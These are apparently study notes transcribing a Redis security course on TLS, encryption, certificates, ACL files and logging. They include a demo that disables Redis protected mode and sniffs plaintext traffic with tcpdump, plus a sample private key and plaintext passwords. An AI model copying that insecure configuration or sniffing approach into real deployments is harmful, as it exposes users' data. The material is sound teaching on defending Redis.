### On Security (cont.)


### Prologue 
This article is created from transscript of [RU330](https://redis.io/university/courses/ru330/) verbatim, not because of my laziness. But for the great significance and unstirrable value in the aforementioned narrative of the course. Nevertheless links and addenda will be appended whenever it is appropriate.


### I. [Introduction to TLS](https://youtu.be/tkfOV_zl08I)
We're now going to start learning about transport layer security, or TLS as it's commonly known. TLS is a series of protocols that secure communication across a network. For example, the connection between your web browser and the server it's connecting to is almost always secured using TLS. In Redis 6, you use TLS to secure network communications to Redis. 

**TRANSPORT LAYER SECURITY**
- Protocols that secure network communication 
- Built into Redis 6

So what exactly does TLS do? If you take a moment to consider what's required to have a private conversation over a network, you can break it down into three requirements --  

- PRIVACY
- AUTHENTICATION
- INTEGRITY

First, you need to know that your communication is private. That is no one should be able to read the messages you're sending back and forth across the network. 

Second, you need to be able to reliably identify the person or entity you're communicating with. For example, if you're trying to connect to your bank, then you need to know that the website you're connecting to is indeed run by your bank and not by some criminal pretending to be your bank. That's the authentication or identity requirement. 

Finally, you also want to know that the messages being sent back and forth between, say, you and your bank have not been corrupted or tampered with in any way. There can't be a *man in the middle* altering those messages. This is the integrity requirement. 

**TLS ALLOWS YOU TO ACHIEVE**
- Privacy 
- Identity 
- Integrity 

TLS solves all these problems, plus a few more. And the primary tools it uses to achieve this are encryption and public key infrastructure. Those two ideas may not mean much to you now. But we're going to explore them in the next few units, just before we learn exactly how to configure TLS in Redis. 

**HOW TLS SECURES CONNECTIONS**
- Encryption 
- Public key infrastructure 

If you understand encryption, even on a basic level, then you have a much better idea of what you're doing when you're configuring TLS in your own Redis deployments. 


### II. [Redis Horror Story #3](https://youtu.be/foOn3sED2EM)
Before we get into the meat of this unit, let's do one final horror story. We've talked a lot about how to secure Redis processes and Redis users. But what about the network connections themselves? In this final horror story, I want to talk about packet sniffing or packet capture. 

- Packet sniffing can be used to intercept unencrypted traffic.
- Easy to view unencrypted traffic on the network 
- TLS helps prevent packet sniffing exploits 

Packet sniffing is the act of recording the individual segments of data traveling over a network. And it's commonly used to analyze networks. The upshot is that it's pretty easy to record and view unencrypted network traffic. And that includes the traffic between your applications and your database. And if an attacker is sniffing your unencrypted network traffic, well, that can easily turn into the kind of horror stories we want to avoid. 

So let's quickly see just how easy it is to view unencrypted traffic on a network connection and how to prevent that with TLS. Here, you can see I have two terminal windows open, one is my Redis client and the other is Redis server. I'm here on the server now. I'll start my server in the least secure way I know, for demonstration purposes, obviously, without a configuration file and just with the defaults. 
```
redis-server 2>&1 > redis.out & 
```

Next, I'll disable protected mode from the command line so that we can make a remote connection. 
```
redis-cli 
config set protected-mode no 
exit
```

Finally, I'll launch `tcpdump`. `tcpdump` allows me to inspect all of the traffic running between my Redis client and the Redis server. 
```
tcpdump port 6379 
```

Now, let's switch back to our client terminal window. I'll connect to the server I've just started using the Redis CLI. Now that I'm connected, I'll write some sensitive data to Redis.
```
redis-cli -h ru330.redis 
hset user:1:secret gender m birthdate 19790101 ccn 5270426764505555 ccn_expire 1224 
```

Here, I'm entering a gender, birthday, credit card number, and credit card expiration date. Now, let's look at the output of the `tcpdump` command. If you look closely, you'll see everything I just sent to Redis, including all of the sensitive data is there. 

![alt tcp dump output](img/tcpdump-output.png)

In this example, I'm sniffing unencrypted data from the server where Redis is hosted. But this kind of surveillance can be run on any server, network switch, or router that sits between your Redis client and your Redis server. This means that usually there are quite a few opportunities for someone to sniff and record unencrypted network traffic. 

Running a `traceroute` from your client to your Redis server will give you an idea of just how many sniffing opportunities might exist. And you can't secure this network route because it's completely outside of your control. 
```
traceroute ru330.redis.cloud 
```

So let's see what happens if we encrypt our network traffic using TLS instead. I'm going to start Redis again, this time with TLS enabled. Now I'll clear my screen and start that `tcpdump` again. Moving back to my client screen, I'll now connect to Redis, this time using TLS. 
```
redis-cli -h ru330.redis --tls --cacert ca.crt 
```

This means my connection is now encrypted. Now I'll issue the same command I did before. Then, let's look again at the `tcpdump` output. See the difference? All you can see now are what appear to be a bunch of random characters. This is the value of encryption in action. Encryption protects your sensitive data from prying eyes on the network. 

For the rest of the unit, I'm going to explain how TLS works and everything you need to know to set it up with Redis. But first, two key points to remember for now. 

- First, if you're storing sensitive information in Redis, and most personal information is sensitive, then you should encrypt your Redis connections with TLS. 
- Second, even if you're using TLS, avoid public networks if you can. If you're on a private network, you greatly limit the number of attack vectors. OK. So with that out of the way, let's learn about TLS and how to use it with Redis.

**Addendum**

Life in Windows is no better than that in Linux for there is no such things as `tcpdump` bundled with. However, one can install [WinShark](https://www.wireshark.org/#homeMemberLink) which requires [Npcap](https://npcap.com/) to work together. 

![alt winshark](img/winshark-1.JPG) 

Typically, redis client uses [RESP](https://redis.io/docs/latest/develop/reference/protocol-spec/) protocol, which is plain text, to communicate with redis server. As you can see in following screens. 

![alt unsafe 1](img/unsafe-1.JPG)

![alt unsafe 2](img/unsafe-2.JPG)

All commands sent as well as results received can be cleally seen. 


### III. [Encryption](https://youtu.be/ULlTtFlSmkY)
Encryption is the process of taking a message and encoding it so that only the intended recipients can read it. The algorithm you use to encrypt a message is called a *cipher*. Most of us are familiar with basic substitution ciphers such as [ROT13](https://en.wikipedia.org/wiki/ROT13). In ROT13, you can encrypt text by substituting or rotating each letter in a message with the letter that appears 13 letters later in the Latin alphabet. So for example, suppose we start with the plain-text message "HELLO". If we encrypt "HELLO" using ROT13, we get the cipher text URYYB.

![alt HELLO](img/HELLO.png)

Shifting the H 13 letters forward gets us U and so on. To decrypt the cipher text, we just perform the reverse operation. Take a moment to see if you can decrypt the ROT13 encoded message you see on the screen now. 
```
SYNZVATB
```
```
FLAMINGO
```

Of course, the ciphers used by TLS are much more sophisticated than ROT13. TLS relies on two types of ciphers, *symmetric* key ciphers and *asymmetric* key ciphers. Now when I say key here, I'm talking about an encryption key. An encryption key is a little bit like a password, but it's generally much longer than a password and not really easy for a human to memorize. Ciphers use encryption keys to encrypt and decrypt data. 

In symmetric key cryptography, the same key is used for both encryption and decryption. 

![alt symmetric](img/symmetric-encryption.png)

In asymmetric key cryptography, one key is used for encryption, and a different key is used for decryption. 

![alt asymmetric](img/asymmetric-encryption.png)

Let's look at some examples to see how this works. 
```
hexdump -C treasure-map.txt
000000  48 61 6c 65 6c 65 61 20 46 6f 72 65 73 74 20 52  Halelea Forest R
000010  65 73 65 72 76 65 0d 0a 32 32 2e 31 31 31 38 32  eserve..22.11182
000020  35 0d 0a 2d 31 35 39 2e 34 36 34 35 30 35 0d 0a  5..-159.464505..
000030  22 58 20 6d 61 72 6b 73 20 74 68 65 20 73 70 6f  "X marks the spo
000040  74 21 22                                         t!"
```

If you've ever encrypted a file, you've probably used a symmetric key cipher. Here I'm using the `gpg` command line utility to encrypt a file called treasure-map.txt.
```
gpg --symmetric --cipher-algo AES256 --no-symkey-cache --output treasure-map.encrypted treasure-map.txt

hexdump -C treasure-map.encrypted
000000  8c 0d 04 09 03 02 8d 03 43 0b 9b 93 fb 49 f5 d2  ........C....I..
000010  87 01 99 a6 ba b1 5a 51 12 31 fa f8 5f d0 07 d7  ......ZQ.1.._...
000020  b0 4a a9 11 c2 aa 13 12 5c 1d 8e 52 99 7c 38 23  .J......\..R.|8#
000030  18 73 da 20 e2 88 67 24 c7 bf 20 54 53 9a a4 0d  .s. ..g$.. TS...
000040  03 2d c2 c8 45 d7 cc 43 2f 49 95 3f de e0 0d bd  .-..E..C/I.?....
000050  62 6f ba f7 81 53 0f a6 4a 1d f2 0d 90 23 67 dd  bo...S..J....#g.
000060  ed e7 13 f1 b7 dd 9a b4 86 c4 36 fc 97 1f f4 8e  ..........6.....
000070  64 ed 03 1d 37 0d 5e 7e 32 6d 60 2b f7 44 0c a6  d...7.^~2m`+.D..
000080  cd 96 e9 7a 53 5d 00 e6 03 37 83 76 00 2e d1 0a  ...zS]...7.v....
000090  8f c2 cd fb 49 0b 22 03                          ....I.".
```

Here I'm specifying that I want symmetric encryption, that I want to use the AES256 cipher, which is a commonly used symmetric key cipher, that the output should be written to a file called treasure-map.encrypted, and that the file I want to encrypt is called treasure-map.txt. 

When I run this command, the program asks me for a password. Now this is important. 

![alt passphrase](img/passphrase.JPG)

gpg uses the password I enter to generate an encryption key, and then it uses that encryption key to encrypt the file. So now we can see the encrypted file.

To decrypt the file, I run gpg's decrypt command, providing the password that I use to encrypt the file.
Again, gpg then uses that password to generate the key that will successfully decrypt the file.
```
gpg --decrypt treasure-map.encrypted
gpg: AES256 encrypted data
gpg: encrypted with 1 passphrase
Halelea Forest Reserve
22.111825
-159.464505
"X marks the spot!"
D:\RU\RU330>123456789
```

Clearly, you need to keep the password and encryption keys secret if you want your encrypted file to remain secret. 

Now suppose it's my friend, Captain Long Beard, who wants to send me the encrypted treasure map. If I want to receive this encrypted map, then I also need to receive the password or key that was used to encrypt it, but of course, I run into a problem here. How is that Captain securely share the key with me?  He needs to be very careful when sharing his secret key because if it gets into anyone else's hands, then they'll be able to decrypt the map. That's where asymmetric key encryption comes in. 

As I mentioned, asymmetric key ciphers use two keys, one to encrypt and another to decrypt. The key to encrypt is called the *public* key, and the key to decrypt is called the *private* key. Do you see why? You can share your public key far and wide, and it doesn't matter who gets access to it. Public keys are meant to be publicly distributed. I can safely share my public key in an email, a tweet, or a published blog post. Once Captain Long Beard has my public key, he can use it to encrypt messages for me. To decrypt those messages, I need to use my private key. Obviously, then, I need to keep my private key secret. We're going to use the openssl command line utility to see how asymmetric encryption works in action.

First, I'm going to generate my private key, so I run the `openssl genrsa` command. This creates the file that I'll use as my private key. Remember that this file can't be shared with anyone. Here's what the contents of the file look like. 
```
openssl genrsa -out key.pem 2048
Generating RSA private key, 2048 bit long modulus
............................................................+++++
...............................................................................................................................................................................+++++
e is 65537 (0x010001)

head -n 15 key.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2AvmKYv4rX6WbjN7US2sca0OzOqDaiB2mSOi1J8gMeAs/ZxQ
ZV6IFxw/djpn1H6RxqsSWKvMMzwWZdz/wOIphPEcxpKDR+Zmhd+i7kJ/5OEOWc26
gI1yquPzZ2exNdC0vEs4fnZopqABNzngugXvLolmzNvH6gRh7DUelBqIw59Xt8h1
7/W9nWG64/9wKs+jblgFNAHjPiQYd5zdurcfwiX9wuPJ1M8QjMlpteIMrpczp6UL
i74Ra6miEcg6MtwkruG2PtLX0jSJEOOX/WTSbUsSRMpZdnK6J+sLaVpp4gZerznV
oG4D1Ib044JwFC0EHHxW1UPsZ63H44mXSfu1IwIDAQABAoIBAQCPd1dgP5LjoyxC
Ae3h+nKJCmLJsPGTh/s5tnBqwUCf3j4CK8s3hY7Zyehamm5YrbQgOXn1aCAx5bT5
78fmTklD/tkdBC4pkNaED/4iOgaz9r+Q4wz2UPfUg4sfH7yOAAoE/+6EDB1yiM5F
3ildXpN2U8fwQgJ/ZGmicaPctcIcJHuUXZR17aosBs4u8pKm/eli87RFmUF0JyM+
UQ8Kv5VSMCubEqNifIHfyJfrm10aftRRMYvXuFb6CMF3MtGQ+/mGwcjNhAkDVye7
ojTR+JlAWqsRd8Jqy0IwhTOVt2rD4khdRktEOzdvnjdpz3TWY68ARtoh1K8E68GA
lIKZ0XABAoGBAPNmtBFSXzSqbcYwlN/xYtURw2rm4VN8os/p4K4DWiNmSz13DGj1
8OgyebAEBNAhNt3Q8fGmu4+YHW3je2UJgePZLX9EYHYzqZ395vj8567tnUlDv6HN
xngg0b4tFUrtZt+citK9C+Gm9divtXhADdU2Ro7kqE7Zld3CpXknsZKlAoGBAOM6
```

Now, an interesting fact is that the private key file actually contains the public key, but we need to extract it. So here's the command to do that, and here's what the public key actually looks like. 
```
openssl rsa -in key.pem -out key.pub -pubout
writing RSA key

cat key.pub
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2AvmKYv4rX6WbjN7US2s
ca0OzOqDaiB2mSOi1J8gMeAs/ZxQZV6IFxw/djpn1H6RxqsSWKvMMzwWZdz/wOIp
hPEcxpKDR+Zmhd+i7kJ/5OEOWc26gI1yquPzZ2exNdC0vEs4fnZopqABNzngugXv
LolmzNvH6gRh7DUelBqIw59Xt8h17/W9nWG64/9wKs+jblgFNAHjPiQYd5zdurcf
wiX9wuPJ1M8QjMlpteIMrpczp6ULi74Ra6miEcg6MtwkruG2PtLX0jSJEOOX/WTS
bUsSRMpZdnK6J+sLaVpp4gZerznVoG4D1Ib044JwFC0EHHxW1UPsZ63H44mXSfu1
IwIDAQAB
-----END PUBLIC KEY-----
```

So now I just need to send my public key to the Captain. It doesn't matter how I send it because it's only used for encryption, not decryption. I can send it over email, or I can paint it on a billboard. 

Now Captain Long Beard can use my public key to encrypt the file containing the treasure map. This is the openssl command he'll run. 
```
openssl rsautl -in treasure-map.txt -out treasure-map.encrypted -pubin -inkey key.pub -encrypt

hexdump -C treasure-map.encrypted
000000  32 c8 72 66 ae fc a4 77 33 49 cf 7a b0 da ff 2b  2.rf...w3I.z...+
000010  72 98 c5 e0 86 bd 0e 63 ba fa d1 1a 30 67 d2 ed  r......c....0g..
000020  7a 63 01 05 a9 90 a1 6b fa 46 e6 bb e0 c1 d2 3e  zc.....k.F.....>
000030  e0 9a e6 fe ff 2a eb c3 70 08 44 ca 3d cd c2 bf  .....*..p.D.=...
000040  68 99 31 9b 99 aa 37 a5 ab a0 d0 7f 70 f9 2f 02  h.1...7.....p./.
000050  ea 7c c8 db c2 ac 9d 8b 17 f2 02 5f df 3c 63 07  .|........._.<c.
000060  36 7b a0 eb cf 88 43 f6 83 88 13 fd 6a cd 0a 86  6{....C.....j...
000070  27 ac ee 61 01 38 71 c2 16 b7 87 c6 66 59 27 a9  '..a.8q.....fY'.
000080  26 19 06 c7 7c cc de 5a 52 22 e2 42 9a 40 44 9c  &...|..ZR".B.@D.
000090  5b f1 83 aa db f5 5c 55 00 d2 c8 27 85 91 46 d6  [.....\U...'..F.
0000a0  c8 bc e6 28 a3 b1 6e 18 c0 fe 47 02 a7 79 a5 49  ...(..n...G..y.I
0000b0  ea 17 e7 36 50 4e 89 3d 39 e5 d5 4f 1d fa 72 57  ...6PN.=9..O..rW
0000c0  84 29 35 ed 56 f5 7e 55 1e 9e 6b 14 cb 12 37 c9  .)5.V.~U..k...7.
0000d0  0a 31 a7 dc c8 eb 4b c5 27 c9 06 40 52 9c fb a5  .1....K.'..@R...
0000e0  78 b0 fa 1f 7e 3d 7f 44 f9 61 0b 44 af 91 a9 e8  x...~=.D.a.D....
0000f0  20 66 8e 14 dd dc 23 d6 22 d6 54 90 ff 76 83 a4   f....#.".T..v..
```

He then sends me the encrypted file, treasure-text.encrypted. Once I get the file, I use my private key to decrypt it. Here's the openssl command I'll run. 
```
rsautl -in treasure-map.encrypted -inkey key.pem -decrypt
Halelea Forest Reserve
22.111825
-159.464505
"X marks the spot!"
```

If I'm using the correct private key, then I'll be able to decrypt the cipher text into the plain text message that leads me to the treasure. 

OK. So there's another important difference between asymmetric key and symmetric key ciphers, which is performance. Asymmetric key ciphers are much more computationally expensive and often thousands of times slower than symmetric key ciphers, so if you need to encrypt a lot of data, you should actually use a symmetric key cipher. And TLS actually uses both.

TLS uses asymmetric key cryptography to help the two parties establish a shared secret key, and then TLS switches to symmetric key cryptography for all subsequent exchange of data. 

![alt performance considerations](img/performance-considerations.png)

Let me elaborate on that just a bit. Here's how a TLS connection to your bank works on a very rudimentary level. 

- Step one, you connect to your bank's website. 
- Step two, your bank sends you its public key. 
- Step three, you use the bank's public key to encrypt and send a large random number. 
- Step four, the bank decrypts the number with its private key. Now you and your bank both have this secret, random number. 
- Step five, you and your bank independently use this secret random number to generate an encryption key that you'll use with symmetric cryptography. 
- Step six, communication then switches to using a symmetric key cipher. You and your bank then encrypt and decrypt all subsequent communication using the same encryption key you both just independently generated. 

![alt bank-1](img/bank-1.png)

![alt bank-2](img/bank-2.png)

OK. We've just covered a lot of material, and you may need to re-watch this video to really master it. But at this point, you should have a sense for what encryption is and how it ensures the privacy of a conversation. In the next units, we'll see how TLS solves the problems of authenticity and integrity.

- [gpg - GNU Privacy Guard](https://gnupg.org/)

- [OpenSSL Command Line Utilities](https://wiki.openssl.org/index.php/Command_Line_Utilities)


### IV. [Authentication](https://youtu.be/aD9L_hlXx04)
In the last unit, we looked at the basics of encryption
and a simplified version of TLS.
You should recall that a TLS connection
starts with the exchange of a public key.
Of course, public keys are designed to be shared freely.
But there's a problem here that we haven't discussed.
If someone provides you with their public key
over the internet, how do you know
that the public key you've been given actually
belongs to the person you want to communicate with?
This is the problem of authentication.
And TLS solves this problem using a variety of techniques.
These include asymmetric-key ciphers, certificates,
certificate authorities, and digital signatures.
By the end of this unit, you'll understand
each of these concepts and how they're
combined to create secure, authenticated connections.
Let's review how a TLS connection is initiated.
Say you want to create a secure connection to your bank, which
lives at the URL, moneybags.com.
When you navigate to https://moneybags.com
with your browser, you're announcing
that you'd like to connect to a server hosted on this domain.
So a server at moneybags.com then sends you its public key.
Now it's time to put on your paranoid hat.
Suppose an evil underground organization
has taken control of moneybags.com
and rerouted the domain to their nefarious servers.
If that's happened, then the public key you've been given
doesn't belong to your bank at all.
It belongs to an attacker.
And that means that any data you encrypt and send
with that public key can and will be read by the bad guys.
So you need a way to verify that the public key you've
received indeed belongs to the server you're connecting to.
Again, this is called authentication.
TLS solves the authentication problem
first by using a trusted third party.
To understand the idea of a trusted third party,
let's think about a passport.
I'm an American citizen.
So I carry a US passport.
When I travel internationally, I present my passport
to identify myself.
Suppose I'm traveling to the country of Lilliput.
If I don't have a passport, the Lilliputian border control
isn't going to let me in the country.
Why?
Because they have no way of verifying that I'm the person
I say I am.
But if I have a valid US passport,
then they will trust me.
Why?
Because hopefully they trust the US government.
And the US government, by issuing me a passport,
is vouching for my identity.
So to break this down, my passport
is a document that certifies my identity.
The US government is a third party that issued my passport.
To enter a new country, I need a passport issued
by a trusted third party.
If the Lilliputian government trusts
the US government to issue valid passports,
and if I have a valid US passport,
then I can enter the country.
An important point here is that each government gets
to decide which third parties, or which other governments,
it's going to trust to issue valid passports.
So let's take the analogy back to TLS.
When you connect to your bank online.
The bank presents its public key in the form
of a digital certificate.
A digital certificate is an electronic document
that proves ownership of a public key.
This document is issued by a third party known
as a certificate authority.
The certificate contains a public key.
But it also contains a digital signature
which validates the contents of the certificate.
To complete the analogy, the digital certificate
is like a passport.
The certificate authority is like the government
that issued the passport.
And the digital signature is akin to the physical features
of the passport that allow a border agent to verify
its authenticity, things like watermarks,
holograms, and biometric chips.
So let's briefly look at a real website
to see how this all works.
Here, I'm connecting to https://wikipedia.org.
If my browser successfully connects,
then I'll see a little lock icon to the left of the address.
I can click on this icon to get more information
about the security of the connection.
Specifically, I can view Wikipedia's server certificate.
This is the certificate that was presented to my web browser
when it initially connected.
You can see it first that this certificate is for servers
accessible at *.wikipedia.org.
So wikipedia.org plus any subdomain.
You can also see when the certificate expires.
Scroll down a bit further and you'll see the public key,
along with which asymmetric key cipher was used to generate it.
In this case, it was an elliptical curve cipher.
You can also see the signature that verifies the key along
with the algorithm used to generate it.
Finally, you should also notice the name of the certificate
authority that signed this certificate.
In this case, the certificate authority
is called Let's Encrypt.
Let's Encrypt is what's known as a intermediate certificate
authority.
What validates the authority of an intermediate certificate
authority?
A root certificate authority does that.
Here, the root certificate authority
that verifies Let's Encrypt as a valid certificate authority
is the digital signature trust company.
Its root certificate is called DST Root CA X3.
Your browser or operating system maintains
a list of root certificate authorities
that it implicitly trusts.
On Mac OS, you can see a list of all the root
certificates it trusts by opening up the keychain app.
So here's the list of authorities
that my system trusts.
And you can see the DST Root CA certificate authority
that certifies the Let's Encrypt certificate
authority, which certifies Wikipedia's certificate.
And by the way, there's a name for this web
of root and intermediate certificate authorities
that certify the authenticity of digital certificates.
It's known as Public Key Infrastructure, or PKI.
Anyway, what all this means is that for a certificate
to be trusted, the certificate must
be traceable back to a trusted root certificate authority.
So to take this full circle, the root certificate authorities
are the trusted third parties you
use to authenticate the public key of any server you connect
to.
Your browser will form a secure connection
if, one, the certificate presented
matches the domain name of the server you're
trying to connect to, so, in this case, wikipedia.org,
and, two, the certificate can be traced back
to a trusted third party which will
include any root certificate authority trusted
by your browser.
That's pretty amazing, right?
What all this implies is that it's really important
that all of the root certificates installed
in your browser or computer are trustworthy.
If an attacker were able to install a root certificate
on your computer, then they might
be able to implement various man in the middle attacks.
Describing how this works in detail
is beyond the scope of this course,
but I encourage you to go do some casual research
to learn about how these attacks have occurred in the past.

- [Digital Certificates (Wikipedia)](https://en.wikipedia.org/wiki/Public_key_certificate)

- [Certificate Authority (Wikipedia)](https://en.wikipedia.org/wiki/Certificate_authority)

- [Man-in-the-middle Attack (Wikipedia)](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)

**Addendum**

To check the list of certificates in Windows 10, you can use the Microsoft Management Console (MMC) and the Certificate Manager snap-in. Here's how you can access and view the certificates:

1. Press the `Windows key + R` on your keyboard to open the "Run" dialog box.
2. Type **mmc** and press Enter. This will open the Microsoft Management Console.
3. In the Microsoft Management Console window, go to "File" -> "Add/Remove Snap-in".
4. In the "Add or Remove Snap-ins" window, select "Certificates" and click the "Add" button.
5. In the next window, select "Computer account" and click the "Next" button.
6. Choose "Local computer" and click the "Finish" button.
7. Click the "OK" button to close the "Add or Remove Snap-ins" window.
8. In the Microsoft Management Console window, expand "Certificates (Local Computer)".
9. You will see a list of certificate stores, such as "Personal", "Trusted Root Certification Authorities", "Intermediate Certification Authorities", etc.
10. Expand the desired certificate store to view the certificates within that store.

![alt mmc](img/mmc.JPG)

You can now browse through the certificate stores and view the individual certificates within each store. The certificates will be listed with their details, including the certificate name, issuer, expiration date, and other relevant information.

Please note that accessing and managing certificates may require administrative privileges. Additionally, the specific certificate stores and the certificates available may vary depending on your system configuration and installed applications. 
(Generated by ChatGPT)

### IV. [Administering Redis ACLs](https://youtu.be/Q1rPFw6Iz64)
The best way to manage ACL users in Redis is to specify them in an ACL configuration file. If you have just a few users, you can configure them directly in the Redis conf config file. 
```
# Redis ACL users are defined in the following format:
#
#   user <username> ... acl rules ...
#
# For example:
#
#   user worker +@list +@connection ~jobs:* on >ffa9203c493aa99
#
# The special username "default" is used for new connections. If this user
# has the "nopass" rule, then new connections will be immediately authenticated
# as the "default" user without the need of any password provided via the
# AUTH command. Otherwise if the "default" user is not flagged with "nopass"
# the connections will start in not authenticated state, and will require
# AUTH (or the HELLO command AUTH option) in order to be authenticated and
# start to work.
```

But for more complex ACL setups, you can and should write them to a separate configuration file.

> Use an external Redis ACL file to manage ACLs

```
# Using an external ACL file
#
# Instead of configuring users here in this file, it is possible to use
# a stand-alone file just listing users. The two methods cannot be mixed:
# if you configure users here and at the same time you activate the external
# ACL file, the server will refuse to start.
#
# The format of the external ACL user file is exactly the same as the
# format that is used inside redis.conf to describe users.
#
# aclfile /etc/redis/users.acl
```

or 
```
# Included paths may contain wildcards. All files matching the wildcards will
# be included in alphabetical order.
# Note that if an include path contains a wildcards but no files match it when
# the server is started, the include statement will be ignored and no error will
# be emitted.  It is safe, therefore, to include wildcard files from empty
# directories.
#
# include /path/to/local.conf
# include /path/to/other.conf
# include /path/to/fragments/*.conf
#
```

In this unit, we're going to show you just how to do that. But before we move on, let me just do a quick shameless plug and say that if you have dozens of users and complex roles to configure, then you might want to check out Redis Enterprise Software or Redis Enterprise Cloud. Both of these products feature role based access control or RBAC for short. And that means that you can define generic roles and then assign those roles to your users. And all of this is done using a user friendly UI. So this will likely be more convenient if you're a bigger organization.

> Redis Enterprise & Redis Enterprise Clould come with role based access control to simplify provisioning ACLs. 

OK, back to our open source Redis. when you're configuring access control lists in a file, you want to start with the `user` directive, followed by the syntax used with the `ACL SETUSER` command. Let's see how we'd store the three users we created in the last unit. We're going to store this configuration in a file called `acl.conf`. We're referencing the file from a `redis.conf` file, as you can see here. So let's now open up `acf.conf`.

First, we disable the default user. 
```
user default off 
```

Next, we specify our three users: Falco, Rick, and cacheservice. 
```
user falco on #80e5b5a554cccea7aad01d910203bb6364d2ae4b4f321cd91841821913a8574a +@all -@dangerous -@admin +acl|whoami allkeys 

user rick on #6d08a4e630e4aa0d5cd873e65aea0a23df42de61073ecb49ef17158fe6a9dcea +@admin 

user cacheservice on #a9c5ed4cb5ff21ddf0d2125554aa94c5ab487803bb27eca081b925cde8473360 +set +get ~cache:*
```

Notice that each user declarative starts with the user directive. You'll also notice a long, encoded string beginning with a pound sign. This is the user's password hashed with the sha256 hash function. *If you're going to store ACL configuration in a file, it's really important never to store the passwordsas plain text*.

So here, we've hashed the passwords. The pound sign tells Redis that these passwords have been hashed with the [sha256](https://computersciencewiki.org/index.php/SHA256) hash algorithm. So how do you hash your passwords? You can run them through the Linux shasum utility like this. 
```
echo -n "pickle" | shasum -a 256
```

Here, I'm getting the shasum for the password: pickle. But it's probably easier to start up a Redis instance, configure your ACLs from the command line, and then call `ACL SAVE` so that Redis will write out the configurations to a file for you. To do this, all you need is a user who has access to the @admin cat command category or permissions the ACL command.

Let's use the command line to add a new user named Claude with the password: blueberry. Next, we'll call `ACL SAVE`. 
```
redis-cli 
AUTH rick pickle 
ACL SETUSER claude on >buleberry +@admin 
ACL SAVE 
EXIT
```

Now, if we open up our acl.conf file, we can see that Redis has written our ACL users alphabetically and in a fully normalized form. 

![alt acl save](img/acl-save.png)

Here's the line with the user we just added. And notice that Redis writes out the hashed password for us. Once we've updated our ACL file locally, we need to get it into our Redis servers. We'll assume that you have a way of syncing configuration files to your production deployment. Once you've done that, issue an `ACL LOAD` command to each Redis server in your deployment. 

![alt load acl](img/load-acl.png)

This will ensure a zero downtime update. Now, let's look at some commands you might run when you're administering ACLs from the Redis CLI.

First, I'll run an `ACL WHOAMI`. This command will show me which user I'm currently logged in as. Here you can see, I'm logged in as Rick. To see a list of all Redis database users, run the `ACL LIST` command. Notice the default user is off and has access to no commands. You'll also see other users we've provisioned. We can also use the `ACL CAT` command to explore command categories. So here are all the categories. And as I said in the last unit, you can also use the ACL CAT command to see which commands each category includes. So here's what's included in the scripting commands category. 
```
ACL CAT scripting 
1) "script|flush"
2) "script|help"
3) "script|debug"
4) "script|load"
5) "script|exists"
6) "script|kill"
7) "eval"
8) "fcall_ro"
9) "function|load"
10) "function|flush"
11) "function|dump"
12) "function|help"
13) "function|delete"
14) "function|kill"
15) "function|restore"
16) "function|list"
17) "function|stats"
18) "fcall"
19) "evalsha"
20) "evalsha_ro
```

OK, finally to delete a user, run the` ACL DELUSER` command. This is the sort of ACL modification you might need to make in production in the event of some kind of emergency. Just be sure that any change you make here also gets written back to your ACL configuration files. 

At this point, you should have all the basic knowledge needed to start using ACLs with your own Redis deployments. There are a few more details in the Redis ACL docs, which you should explore at your leisure. We'll link to those docs in the course handout.

[ACL commands at Redis.io](https://redis.io/commands#server)

[ACL documentation at Redis.io](https://redis.io/topics/acl)

> The best way to manage ACL users in Redis is to specify them in an ACL configuration file. If you have just a few users, you can configure them directly in the redis.conf configuration file. For large and complex ACL setups, you can and should write them to a separate configuration file.

Finally, for complex ACL setups that require role based access control, you should check out Redis Enterprise Cloud or Redis Enterprise Software. These products can really simplify the management of users and rules. OK, end of shameless plug. See you after the security tips.

![alt enterprise acl](img/enterprise-acl.png)

**Addendum**

1. As far as I can test in Redis 7.2.4, `ACL INFO` has to be granted *explictly* with a `+acl|whoami` even though the user already in @admin. 
2. Redis is rather stringent than prudence in determining the category. As you may see in the `SET` command documentation: Time complexity is O(1) but ACL category is @slow. A search for @dangerous command yields 75, @slow command yields 271! 

![alt set command](img/set-command.jpg)


### V. Dangerous Commands
You probably noticed that Redis has an entire ACL category dedicated to dangerous commands.

So what are dangerous commands, and why are they dangerous?

**Dangerous commands include administrative commands and other commands that may negatively affect database performance or render your database unavailable.**

As a general rule, you should avoid running dangerous commands in production.

#### Administrative commands
You should consider most admin commands dangerous, as you want to prevent these commands from being run by an attacker at all costs.

For example, the `CONFIG` command is an administrative command that allows you to modify the Redis configuration at runtime. Changing the configuration could disrupt applications and cause outages. `CONFIG` should only be used in production by those who understand what they are doing and only when absolutely required.

On the other hand, the `LASTSAVE` command is also an admin command and is therefore marked as dangerous. This command gives you the timestamp of the last successful write to disk. It's highly unlikely that this command could be used to damage Redis in any way.

#### Dangerous commands may impact performance
Commands that may significantly impact performance are dangerous. If you're an experienced Redis user, you probably know to avoid the `KEYS` command. The `KEYS` command scans all keys stored in the Redis server and blocks until it completes. This can take anywhere from several seconds to several minutes depending on the number of keys on the server, which means that this command can block other clients for quite some time. For this reason, `KEYS` is considered dangerous.

#### Dangerous commands may impact availability
The final category of dangerous commands may impact the availability of your Redis database. For instance, the `FLUSHDB` and `FLUSHALL` commands will delete all of the data in your database. Likewise, the `SHUTDOWN` command will terminate the Redis process. Obviously, running this command on a production database will affect your applications negatively.


### VI. Redis Logging
Redis comes with two types of logs relevant to security: the ACL log and the Redis server log files.

**The ACL log allows you to see failed authentication attempts and failed access attempts when access to a key or command is blocked by an ACL.**

The ACL log is stored in memory, in Redis itself. By default, the log stores 128 entries, but this is configurable.

#### Using ACL LOG
To demonstrate, let's first create a new user 'john' with access to the key "foo" and the command GET.
```
> ACL SETUSER john on >password +get +acl ~foo*
```

Then we can create two keys: foo and bar.
```
> SET foo bar
> SET bar foo
```

When we authenticate as john, you can see that the user cannot set the key foo because he does not have access to the SET command and can not GET the key bar because he doesn’t have access to that key.
```
> AUTH john password
> SET foo pickle
(error) NOPERM this user has no permissions to run the 'set' command or its subcommand >
GET bar
(error) NOPERM this user has no permissions to access one of the keys used as arguments
```

We can call ACL LOG to view these failed access attempts.
```
> ACL LOG
1)  1) "count"
    2) (integer) 1
    3) "reason"
    4) "key"
    5) "context"
    6) "toplevel"
    7) "object"
    8) "bar"
    9) "username"
   10) "john"
   11) "age-seconds"
